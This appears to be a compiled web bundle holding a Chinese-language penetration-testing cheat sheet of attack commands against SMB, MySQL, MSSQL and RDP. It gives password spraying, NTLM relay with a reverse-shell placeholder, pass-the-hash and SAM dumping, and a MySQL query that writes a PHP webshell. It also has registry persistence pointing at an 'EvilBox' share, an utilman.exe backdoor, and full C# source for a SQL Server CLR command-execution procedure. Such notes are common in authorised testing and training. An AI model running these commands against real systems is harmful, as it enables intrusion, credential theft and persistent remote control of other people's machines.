\u6307\u4ee4\uff1a",(0,i.jsx)(n.a,{href:"https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr",children:"findstr"})]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"smbclient -N -L //<IP>"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"-N"})," No password \u533f\u540d\u767b\u5165"]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["smbmap \u53ef\u4ee5\u544a\u8a34\u6211\u5011\u7576\u524d\u6b0a\u9650\u53ef\u4ee5\u5b58\u53d6\u54ea\u4e9b\u6a94\u6848\uff1a",(0,i.jsx)(n.code,{children:"smbmap -H <IP>"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"-r <\u8cc7\u6599\u593e>"})," \u905e\u8ff4\u958b\u555f\u8cc7\u6599\u593e"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"--download <\u76f8\u5c0d\u8def\u5f91>"})," \u4e0b\u8f09\u76ee\u6a19\u6a94\u6848"]}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:'--upload <\u4e0a\u50b3\u7684\u6a94\u6848> "<\u8def\u5f91+\u6a94\u540d>"'})}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"password-sparying",children:"Password Sparying"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"crackmapexec smb <IP> -u /tmp/userlist.txt -p '<password>' --local-auth"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\u627e\u5230\u4e00\u7d44\u5e33\u5bc6\u5f8c\u7e7c\u7e8c\u7051\uff1a",(0,i.jsx)(n.code,{children:"--continue-on-success"})]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"--local-auth"}),"\uff1a\u76ee\u524d\u7684\u96fb\u8166\u53ef\u4ee5\u767b\u904e\u53bb\u7684"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"forced-authentication-attacks",children:"Forced Authentication Attacks"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"sudo responder -I <interface>"})}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"ntlm-relay",children:"NTLM Relay"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"impacket-ntlmrelayx --no-http-server -smb2support -t <IP>"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"\u62ff\u5230 SAM"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"\u900f\u904e-smb-\u505a\u6a6b\u5411\u79fb\u52d5",children:"\u900f\u904e SMB \u505a\u6a6b\u5411\u79fb\u52d5"}),"\n",(0,i.jsx)(n.p,{children:"\u5f9e\u5bc6\u78bc\u5674\u7051\u4e2d\u62ff\u5230\u5e33\u5bc6\u5f8c\uff0c\u53ef\u4ee5\u5c0d\u5176\u5b83\u53f0\u96fb\u8166\u6a6b\u5411\uff1a"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"impacket-psexec <username>:'<password>'@<IP>"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"crackmapexec smb <IP> -u <username> -p '<password>' -x 'whoami' --exec-method smbexec"})}),"\n",(0,i.jsxs)(n.li,{children:["NTLM relay \u6a6b\u5411\u79fb\u52d5\uff1a",(0,i.jsx)(n.code,{children:"impacket-ntlmrelayx --no-http-server -smb2support -t <IP> -c 'powershell -e <base_revshell>'"})]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"pass-the-hash",children:"Pass the Hash"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\u62ff\u5230\u5225\u53f0\u7684 NTLM hash \u5f8c\uff0c\u53ef\u4ee5\u5728\u6c92\u6709\u5bc6\u78bc\u7684\u60c5\u6cc1\u4e0b\u6a6b\u5411\u79fb\u52d5\uff1a","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"crackmapexec smb <IP> -u <username> -H <NT(LM) Hash>"})}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h4,{id:"\u679a\u8209\u540c\u7d44\u5e33\u5bc6\u7684\u5176\u5b83\u96fb\u8166",children:"\u679a\u8209\u540c\u7d44\u5e33\u5bc6\u7684\u5176\u5b83\u96fb\u8166"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"crackmapexec smb <IP> -u <username> -p '<password>' --loggedon-users"})}),"\n"]}),"\n",(0,i.jsx)(n.h4,{id:"\u522e\u5176\u5b83\u53f0\u96fb\u8166\u7684-sam",children:"\u522e\u5176\u5b83\u53f0\u96fb\u8166\u7684 SAM"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"crackmapexec smb <IP> -u <username> -p '<password>' --sam"})}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"rpc",children:"RPC"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"rpcclient -U'%' <IP>"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"enumdomusers"})}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"sql",children:"SQL"}),"\n",(0,i.jsx)(n.h3,{id:"mysql",children:"MySQL\uff1a"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\u9023\u63a5\uff1a",(0,i.jsx)(n.code,{children:"mysql -u <user> -p <password> -h <IP>"})]}),"\n",(0,i.jsxs)(n.li,{children:["Command\uff1a","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"SHOW DATABASES;"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"USE Database;"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"SHOW TABLES;"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"SELECT * FROM <Table>;"})}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["Read Local Files","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:'select LOAD_FILE("/etc/passwd");'})}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["Command Execution\uff1a","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"SELECT \"<?php echo shell_exec($_GET['c']);?>\" INTO OUTFILE '/var/www/html/webshell.php';"})}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"mssql",children:"MSSQL"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:"\u9023\u63a5\uff1a"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"sqlcmd -S SRVMSSQL -U <user> -P '<password>' -y 30 -Y 30"})," or"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"sqsh -S <IP> -U <user> -P '<password>' -h"})," or"]}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"mssqlclient.py -p <port> <user>@<IP>"})}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"impacket-mssqlclient <user>@<IP> -windows-auth"})," (\u7db2\u5167\u4e92\u6253)"]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:"\u8a9e\u6cd5\uff1a"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"SELECT name FROM master.dbo.sysdatabases"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"USE Database"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"SELECT * FROM <Table>"})}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:"Read Local Files"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents"})}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:"Command Execution\uff1a"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"xp_cmdshell '<command>'"})}),"\n",(0,i.jsxs)(n.li,{children:["xp_cmdshell \u4e0d\u80fd\u7528\u7684\u8a71\uff1a","\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"EXECUTE sp_configure 'show advanced options', 1"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"RECONFIGURE"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"EXECUTE sp_configure 'xp_cmdshell', 1"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"RECONFIGURE"})}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.a,{href:"https://www.netspi.com/blog/technical-blog/network-pentesting/establishing-registry-persistence-via-sql-server-powerupsql/",children:"Extended stored procedure (xp_regwrite)"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"EXECUTE master.sys.xp_regwrite 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 'EvilSauce', 'REG_SZ', '\\\\EvilBox\\EvilSandwich.exe'"})}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["Modify Image File Execution Options (xp_regwrite)","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"EXECUTE master.sys.xp_regwrite 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe', 'Debugger', 'REG_SZ', '\"c:\\windows\\system32\\cmd.exe\"'"})}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["CLR (Common Language Runtime)","\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"sp_configure 'clr enabled', 1;"})," \u555f\u7528CLR\u529f\u80fd"]}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"RECONFIGURE;"})}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"ALTER DATABASE [\u8cc7\u6599\u5eab\u540d\u7a31] SET TRUSTWORTHY ON;"})," \u5141\u8a31\u57f7\u884c\u4e0d\u5b89\u5168\uff08UNSAFE\uff09\u7684 CLR \u7d44\u4ef6"]}),"\n",(0,i.jsx)(n.li,{children:"\u88fd\u4f5c\u81ea\u8a02 CLR DLL"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sql=",children:'using System;\r\nusing System.Data;\r\nusing System.Data.SqlTypes;\r\nusing Microsoft.SqlServer.Server;\r\nusing System.Diagnostics;\r\n\r\npublic partial class StoredProcedures\r\n{\r\n    [Microsoft.SqlServer.Server.SqlProcedure]\r\n    public static void cmd_exec(SqlString execCommand)\r\n    {\r\n        Process proc = new Process();\r\n        proc.StartInfo.FileName = @"C:\\Windows\\System32\\cmd.exe";\r\n        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand.Value);\r\n        proc.StartInfo.UseShellExecute = false;\r\n        proc.StartInfo.RedirectStandardOutput = true;\r\n        proc.Start();\r\n\r\n        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));\r\n        SqlContext.Pipe.SendResultsStart(record);\r\n        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());\r\n        SqlContext.Pipe.SendResultsRow(record);\r\n        SqlContext.Pipe.SendResultsEnd();\r\n\r\n        proc.WaitForExit();\r\n        proc.Close();\r\n    }\r\n}\n'})}),"\n",(0,i.jsxs)(n.ol,{start:"5",children:["\n",(0,i.jsxs)(n.li,{children:["\u7de8\u8b6f dll\uff1a\r\n",(0,i.jsx)(n.code,{children:"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /target:library c:\\temp\\cmd_exec.cs"})]}),"\n",(0,i.jsxs)(n.li,{children:["\u5c07 CLR DLL \u532f\u5165 SQL Server\r\n\u767b\u5165 SQL Server (\u9700\u5177\u5099 sysadmin \u6216 CREATE ASSEMBLY/ALTER ASSEMBLY \u6b0a\u9650)\uff0c\u4e26\u57f7\u884c\u4ee5\u4e0b TSQL\uff1a","\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"USE msdb;\r\n\r\n-- \u555f\u7528 CLR \u529f\u80fd\r\nsp_configure 'show advanced options',1;\r\nRECONFIGURE;\r\nsp_configure 'clr enabled',1;\r\nRECONFIGURE;\r\n\r\n-- \u532f\u5165 CLR \u7d44\u4ef6\r\nCREATE ASSEMBLY my_assembly FROM 'c:\\temp\\cmd_exec.dll' WITH PERMISSION_SET = UNSAFE;\r\n\r\n-- \u5efa\u7acb\u5132\u5b58\u7a0b\u5e8f\u9023\u7d50\u81f3 CLR \u65b9\u6cd5\r\nCREATE PROCEDURE [dbo].[cmd_exec]\r\n@execCommand NVARCHAR (4000)\r\nAS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];\r\nGO\n"})}),"\n"]}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"EXEC dbo.cmd_exec 'whoami';"})}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.li,{children:"\u7121\u6a94\u6848\u65b9\u5f0f\u532f\u5165 CLR DLL"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell=",children:'$assemblyFile = "c:\\temp\\cmd_exec.dll"\r\n$stringBuilder = New-Object -Type System.Text.StringBuilder\r\n$stringBuilder.Append("CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM `n0x") | Out-Null\r\n\r\n$fileStream = [IO.File]::OpenRead($assemblyFile)\r\nwhile (($byte = $fileStream.ReadByte()) -gt -1) {\r\n    $stringBuilder.Append($byte.ToString("X2")) | Out-Null\r\n}\r\n\r\n$stringBuilder.AppendLine("`nWITH PERMISSION_SET = UNSAFE") | Out-Null\r\n$stringBuilder.AppendLine("GO") | Out-Null\r\n\r\n$stringBuilder.AppendLine("CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];") | Out-Null\r\n$stringBuilder.AppendLine("GO") | Out-Null\r\n\r\n$stringBuilder.AppendLine("EXEC[dbo].[cmd_exec] \'whoami\'") | Out-Null\r\n$stringBuilder.AppendLine("GO") | Out-Null\n'})}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:"sqlcmd \u7528\u6cd5\uff1a"}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sql=",children:"1> <\u8a9e\u6cd5>\r\n2> GO\n"})}),"\n",(0,i.jsx)(n.h2,{id:"rdp",children:"RDP"}),"\n",(0,i.jsx)(n.h3,{id:"login",children:"Login"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"rdesktop -u admin -p <password> <IP>"})}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"password-spraying",children:"Password Spraying"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"crowbar -b rdp -s <subnet> -U <user list> -c '<password>'"})}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"hydra -L <user list> -p '<password>' <IP> rdp"})," \u5169\u7a2e\u90fd\u53ef"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"session-hijacking",children:"Session Hijacking"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}"})}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"pass-the-hash-1",children:"Pass The Hash"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\u4f7f\u7528\u524d\u8981\u5728\u78ba\u8a8d\u76ee\u6a19\u4e0a\u8a2d\u5b9a\uff1a","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f"})}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"xfreerdp /v:<IP> /u:<user> /pth:<NTLM>"})}),"\n"]})]})}function t(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(x,{...e})}):x(e)}},8453:(e,n,s)=>{s.d(n,{R:()=>d,x:()=>c});var l=s(6540);const i={},r=l.createContext(i);function d(e){const n=l.useContext(r);return l.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:d(e.components),l.createElement(r.Provider,{value:n},e.children)}}}]);